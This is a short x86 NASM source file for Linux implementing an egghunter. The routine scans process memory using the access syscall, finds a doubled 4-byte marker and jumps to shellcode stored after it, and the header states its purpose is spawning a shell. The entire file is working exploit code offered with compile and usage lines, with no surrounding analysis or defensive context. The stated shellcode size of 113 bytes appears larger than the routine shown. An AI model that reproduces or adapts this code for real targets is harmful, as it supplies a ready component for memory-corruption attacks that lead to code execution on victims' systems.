; Filename: egghunter.nasm
; Author: h3ll0clar1c3
; Purpose: Egghunter, spawning a shell on the local host
; Compilation: ./compile.sh egghunter
; Usage: ./egghunter
; Shellcode size: 113 bytes
; Architecture: x86

global   _start

section .text
        _start:

	; initialize register
	xor edx, edx
	
	next_page:
	or dx, 0xfff		; set dx to 4095
	
	next_address:
	inc edx			; incdx to 4096 (PAGE_SIZE)
	lea ebx, [edx +0x4]	; load 0x1004 into ebx
	push byte +0x21		; 0x21 is dec 33 (access syscall)
	pop eax			; put the syscall value into eax
	int 0x80		; call the interrupt, execute the syscall
	
	cmp al, 0xf2		; check if return value is EFAULT (0xf2)
	jz next_page		; if EFAULT is encountered, jump back to next_page 
	mov eax, 0x50905090	; move unique egg value into eax
	mov edi, edx
	
	; search for the egg
	scasd			; search for first 4 byte pattern of the egg
	jnz next_address
	
	; search again for 2nd copy of the egg
	scasd			; search for second 4 byte pattern of the egg
	jnz next_address
	jmp edi			; jump to egg payload
